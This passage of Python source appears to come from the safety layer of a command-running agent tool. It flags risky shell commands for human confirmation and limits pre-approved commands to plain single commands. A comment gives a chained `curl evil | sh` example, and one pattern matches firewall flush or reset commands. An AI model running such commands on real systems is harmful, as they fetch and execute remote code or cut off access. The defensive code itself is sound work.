     r"\bnft\b[^\n]*\bflush\b|\bufw\b\s+reset\b)", "firewall reset or lockout"),
]
_AUTO_CONFIRM_COMPILED = [(re.compile(p), why) for p, why in AUTO_CONFIRM_PATTERNS]


def auto_confirmation_reason(cmd):
    """Return why *cmd* must still stop in auto mode, or an empty string."""
    if not cmd:
        return ""
    for rx, why in _AUTO_CONFIRM_COMPILED:
        if rx.search(cmd):
            return why
    return ""

# --------------------------------------------------------------------------- #
# Pre-approved commands (--allow / ACT_ALLOW)
# --------------------------------------------------------------------------- #
# A pre-approved command must be ONE plain command: this character allowlist rules out
# chaining (; & |), substitution ($ `), redirection (< >), globs, braces, quotes, ~ and
# newlines in a single rule, so `--allow 'systemctl restart .*'` can never stretch to
# `systemctl restart x; curl evil | sh`. Unit names like getty@tty1.service still pass.
_PREAPPROVE_CHARS = re.compile(r"\A[A-Za-z0-9 _./:=@%+,-]+\Z")


def compile_preapproved(sources):
    """Compile --allow / ACT_ALLOW patterns, each anchored to the WHOLE command.
    Returns (patterns, errors)."""
    out, errors = [], []
    for src in sources:
        src = (src or "").strip()
        if not src:
            continue
        try:
            out.append((src, re.compile(r"\A(?:" + src + r")\Z")))
        except re.error as e:
            errors.append("invalid --allow pattern {0!r}: {1}".format(src, e))
    return out, errors


def preapprovable(cmd, risk):
    """Could an --allow pattern ever pre-approve this `run` command? Plain single commands
    only (no chaining, pipes, redirection, substitution, globs or quotes), never the danger
    tier and never a catastrophic payload (recursive delete, disk destruction, power state,
    ...). Same rule as ACT-Windows. Reported on refused commands (`pre_approvable` in the
    result file) so an approval workflow knows which proposed fixes it can hand back to ACT
    and which a person must apply by hand."""
    text = (cmd or "").strip()
    return bool(text and risk != "danger" and _PREAPPROVE_CHARS.match(text)
                and not auto_confirmation_reason(text))


def preapproved_pattern(cmd, risk):
    """The --allow pattern that pre-approves `run` command *cmd*, or ''. Only commands that
    are preapprovable() qualify: those always need a person otherwise (and are denied in
    --non-interactive). Edits/writes are never covered."""
    if not PREAPPROVED or not preapprovable(cmd, risk):
        return ""
    text = cmd.strip()
    for src, rx in PREAPPROVED:
        if rx.match(text):
            return src
    return ""


